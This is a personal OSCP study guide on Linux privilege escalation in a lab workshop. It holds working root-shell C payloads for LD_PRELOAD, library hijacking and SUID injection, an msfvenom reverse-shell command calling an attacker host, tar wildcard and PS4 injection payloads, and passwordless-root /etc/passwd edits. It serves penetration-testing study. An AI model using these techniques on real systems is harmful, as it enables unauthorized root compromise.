# Linux Privilege Escalation
This is a guide a made while studying for my OSCP. The lectures that I took notes from are <a href="https://www.udemy.com/course/linux-privilege-escalation/">here</a>. The setup and workshop environment are <a href="https://github.com/sagishahar/lpeworkshop">here</a>.

## Kernel Exploits
Kernels are the core of any OS. Exploiting a kernel vulnerability can result in execution as the root user. Finding and using kernel exploits is a simple process:
1. Enumerate kernel version (uname -a)
2. Find matching exploits (Google, ExploitDB, GitHub)
3. Compile and run<br>
Beware: Kernel exploits can often be unstable and may be one-shot or cause a system crash. Should be a last resort. <br>
A good way to find kernel exploits is by using linux-exploit-suggester
```bash
./linux-exploit-suggester -k <kernel-version>
```

## Service Exploits
Servers are simply programs that run in the background, accepting input or performing regular tasks. If vulnerable services are running as root, exploiting them can lead to command execution as root.
The following will show all processes that are running as root
```bash
ps aux | grep "^root"
```
With any result, try to identify the version number of the program being executed.<br>
Running the program with the --version/-v command line option often shows the version number:
```bash
<program> --version
<program> -v
```
On debian-like distributions, dpkg can show installed programs and their version:
```bash
dpkg -l | grep <program>
```
On systems that use rpm, the following achieves the same:
```bash
rpm -qa | grep <program>
```
You can then look on Google, GitHub, Exploit-db, CVE-Mitre, etc for exploits on the specific service.

 ### Port Forwarding
 In some instances, a root process may be bound to an internal port, through which it communicates. If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
 ```bash
 ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
 ```
 First, determine what applications are running on what port:
 ```bash
 netstat -an | grep LISTEN
 
 tcp        0      0 127.0.0.1:3306           0.0.0.0:*   
 ```
 Which means MySQL is only listening on localhost. You can port-forward all information from your host.

On your attacker machine:
```
sudo mysql -u root -h <victim-machine> -P 4444
```
 
 ## Weak File Permission
 System files can be taken advantage of to perform privilege escalation if the permissions on them are too weak. If a system file has confidential information we can read, it may be used to gain access to the root account. If a system file can be written to, we may be able to modify the way the OS works and gain root access that way.<br><br>
 For example, the <b>/etc/shadow</b> file contains user password hashes, and by default is not readable by any user except for root. If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user's password hash. If we are able to modify the /etc/shadow file, we can replace the root user's password hash with one we know.<br>
 If we can write the contents of /etc/shadow for instance, we can replace the root user hash with our own.
 ```bash
 mkpasswd -m sha-512 newpassword
 ```
Historically, /etc/passwd contained user password hashes. For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.<br>
If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.<br>
Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries fo rthe same user ID< as long as the usernames are different.<br><br>
The root account in /etc/passwd is usually configured like this:
```
root:x:0:0:root:/root:/bin/bash
```
The "x" in the second field instructs Linux to look for the password hash in the /etc/shadow file.<br>
In some versions of Linux, it is possible to simply delete the "x", which Linux interprets as the user having no password:
```
root::0:0:root:/root:/bin/bash 
```
### Backups
Insecure backups exist. It's worth exploring the file system looking for readable backup files. Some common places include:
- User home directories
- / (root) directory
- /tmp
- /var/backups

## Sudo
Sudo allows users to run other programs with the security privileges of other users. A user generally needs to enter their password to use **sudo**, and they must be permitted access via rule(s) in the /etc/sudoers file. Rules can be used to limit users to certain programs, and forgo the password entry requirement.

### Useful Commands
Run a program as sudo:
```bash
sudo <program>
```

Run a program as a specific user:
```bash
sudo -u <username> <program>
```

List programs a user is allowd (and disallowed) to run:
```bash
sudo -l
```

Switch user:
```bash
sudo su
```

If the **su** program is not allowed, there are many other ways to escalate privileges:
```bash
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

If we are able to run specific programs as **sudo**, it is sometimes possible to "escape" the program and spawn a shell. Since the program runs with root privileges, so does the spawned shell. A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/#

### Abusing Intended Functionality
If a program doesn't have an escape sequence, it may still be possible to use it to escalate privileges. If we can readfiles owned by root, we may be able to extract useful information. If we can write to files owned by root, we may be able to insert or modify information.

For instance, you can run apache2 as sudo. Apache2 does not have any escape sequences, however when parsing a given config file, it will error and print any line it doesn't understand.

```bash
sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

### Environment Variables
Programs run through **sudo** can inherit the environment variables from the user's environment. 
In the **/etc/sudoers** config file, if the **env_reset** option is set, sudo will run programs in a new, minimal environment.
The **env_keep** option can be used to keep certain environment variables from the user's environment.
The configured options are displayed when running **sudo -l**.

#### LD_PRELOAD
**LD_PRELOAD** is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.

**LD_PRELOAD** will not work if the real user ID is different from the effective ID. **sudo** must be configured to preserve the LD_PRELOAD environment variable using the **env_keep** option.

```bash
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find

```
Note that the env_keep option inlcudes the LD_PRELOAD environment variable

Create a file (preload.c) with the following conents:
```C
/*
 Compile:
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
*/

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Run any allowed program using **sudo**, while setting the LD_PRELOAD environment variable to the full path of the preload.so file:
```bash
sudo LD_PRELOAD=/tmp/preload.so apache2
```

#### LD_LIBRARY_PATH
LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are search for first.
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
The *ldd* command can be used to print the shared libraries used by a program:
```bash
ldd /usr/sbin/apache2
    linux-vdso.so.1 =>  (0x00007fff5c7ff000)
    libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007faa0dc66000)
    libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007faa0da42000)
    libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007faa0d808000)
    libpthread.so.0 => /lib/libpthread.so.0 (0x00007faa0d5ec000)
    libc.so.6 => /lib/libc.so.6 (0x00007faa0d280000)
    libuuid.so.1 => /lib/libuuid.so.1 (0x00007faa0d07b000)
    librt.so.1 => /lib/librt.so.1 (0x00007faa0ce73000)
    libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007faa0cc3c000)
    libdl.so.2 => /lib/libdl.so.2 (0x00007faa0ca37000)
    libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007faa0c80f000)
    /lib64/ld-linux-x86-64.so.2 (0x00007faa0e123000)
```

Hijacking shared objects using this method is hit or miss. Choose one from the list and try it.
Create a file (library_path.c) with the following:
```C
/*
	Compile:
	gcc -o libcrypt.so.1 -shared -fPIC library_path.c
*/

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Run apache2 using sudo, while setting the LD_LIBRARY_PATH environnment variable to the current path (where we compiled library_path.c):
```bash
sudo LD_LIBRARY_PATH=. apache2
```

## Cron Jobs
Programs or scripts which users can schedule to run at specific times or intervals. Cron jobs run with the security level of the user who owns them. By default, cron jobs are run using the /bin/sh shell, with limited environment variables.

Cron table files (crontabs) store the configuration for cron jobs. User crontabs are usually located in **/var/spool/cron** or **/var/spool/cron/crontabs**. The system-wide crontab is located at **/etc/crontab**.

### File Permissions
Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation. If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.

### PATH Environment Variable
The crontab **PATH** environment variable is by default set to **/usr/bin:/bin**
The **PATH** variable can be overwritten in the crontab file. If a cron job program/script does not use an absolute path, and one of the **PATH** directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

### Wild Cards
When a wildcard character (\*) is provided to a command as part of an argument, the shell will first perform *filename expansion* (also known as globbing) on the wildcard. This process replaces the wildcard with a space-separated list of the file and directory names in the current directory. As easy way to see this in action is to run the following command from your home directory:
```bash
echo *
```

### Filenames and Wildcards
Since filesystems in Linux are generally very permissive with filenames, and filename expansion happens before the command is executed, it is possible to pass command line options to commands by creating files with these names.
The following should work:
```bash
ls *
touch ./-1
ls *
```

Filenames are not simply restricted to simple options like -h or --help. In fact we can create filenames that match complex options: --option=key=value.
GTFOBins (https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purpose.

For example, a simple **tar** command:
```bash
tar czf /tmp/backup.tar.gz *
```
Can be used to escalate privileges by using:
```bash
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
```
Where shell.elf is a payload generated by msfvenom:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.16 LPORT=1337 -f elf -o shell.elf
```

## SUID / SGID Executables
**SUID** files get executed with the privileges of the file owner.
**SGID** files get executed with the privileges of the file group.
If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.

We can use **find** command to locate files with the SUID or SGID bits set:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

We can perform shell escape sequences with programs running via sudo, we can do the same with SUID / SGID files.
Certain programs install SUID files to aid their operation. Just as services which run as root can have vulnerability we can exploit for a root shell, so too can these SUID files. 

### Shared Object Injection
When a program is executed, it will try to load the shared object it requries. By using a program called **strace**, we can track these sytem calls and determine whether an shared objects were not found. If we can write to the located the program tries to open, we can create a shared object and spawn a root shell when it is loaded.
For example, looking at suid-so:
```bash
strace /usr/local/bin/suid-so | grep -iE "open|access|no such file"
	access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
	open("/etc/ld.so.cache", O_RDONLY)      = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libdl.so.2", O_RDONLY)       = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libm.so.6", O_RDONLY)        = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libc.so.6", O_RDONLY)        = 3
	open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
The executable is trying to open the libcalc.so shared object but it does not exist. Create the .config/libcalc.so file and give the following contents:
```C
/*
	Compile:
	gcc -shared -fPIC -o libcalc.so libcalc.c
*/

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor))
void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

Execute libcalc.so.

### PATH Environment Variables
PATH environment variable contains a list of directories where the shell should try to find programs. 
If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found. 
Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string.
We can run **strings** on the executable file to find strings of characters.
We can also use **strace** to see how the program is executing. Another program called **ltrace** may also be of use.
Running **strace**:
```bash
strace -v -f -e execve <command> 2>&1 | grep exec
```
Running **ltrace**
```bash
ltrace <command>
```

For example, looking at /usr/local/bin/suid-env on the box, it appears to run apache2 using service command.
```bash
$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
Using strace shows:
```bash
[pid  3106] execve("/bin/sh", ["sh", "-c", "service apache2 start"], ["TERM=screen", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.0.16 54706 22", "SSH_TTY=/dev/pts/0", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.0.16 5470"..., "_=/usr/bin/strace", "OLDPWD=/home/user/tools/suid"]) = 0
```
The apache2 program is being executed using /bin/sh which implies that it is inheriting our environment variables. Because the **service** command does not use an absolute path, we can create our own version of service executable and add it to the PATH variable.
First create a program to be ran which escalates privileges.
```C
/*
	Compile:
	gcc -o service service.c
*/

int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
Prepend current path path to PATH variable and execute /usr/local/bin/suid-env
```bash
$ PATH=.:$PATH /usr/local/bin/suid-env
```

### Abusing Shell Features
In some shells (notably bash < 4.2-048) it is possible to define user functions with an absolute path name. These functions can be exported so that subproccesses have access to them, and the functions can take precedence over the actual executable being called.

For example, running **strings** on the /usr/local/bin/suid-env2 shows that apache2 is being started. Looking at strace shows:
```bash
$ strings
[pid  3812] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"], ["TERM=screen", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.0.16 54706 22", "OLDPWD=/home/user", "SSH_TTY=/dev/pts/0", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user/tools/suid", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.0.16 5470"..., "_=/usr/bin/strace"]) = 0
```
This time, service is given an absolute path. Looking at the /bin/sh version
```bash
$ /bin/sh --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```
This version allows us to write user-defined functions:
```bash
$ function /usr/sbin/service { /bin/bash -p; }
$ export -f /usr/sbin/service
```
Executing /usr/sbin/service gives privilege escalation.


Bash has debugging mode which can be enabled with the -x command line option, or by modifying the SHELLOPTS environment variable to include xtrace.
By default SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.
When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements. This variable can include an embedded command, which will execute every time it is shown.
If a SUID file runs another program via Bash (e.g. by using system()) these environment variables can be inherited. If an SUID file is being executed, this command will execute with the privileges of the file owner. In Bash version 4.4 and above, the PS4 environment variable is not inherited by shells running as root.

We already know that /usr/local/bin/suid-env is running with root permissions and uses an absolute path when using service.
Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

## Passwords and Keys
Weak password storage and password re-use can be easy ways to escalate privileges.
While the root user's account password is hashed and stored securly in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files. If the root user re-used their password for a service, that password may be found and used to switch to the root user.

### History Files
History files record commands issued by users while they are using certain programs. If a user types a password as part of a command, this password may get stored in a history file. It is always a good idea to try switching to the root user with a discoverd password.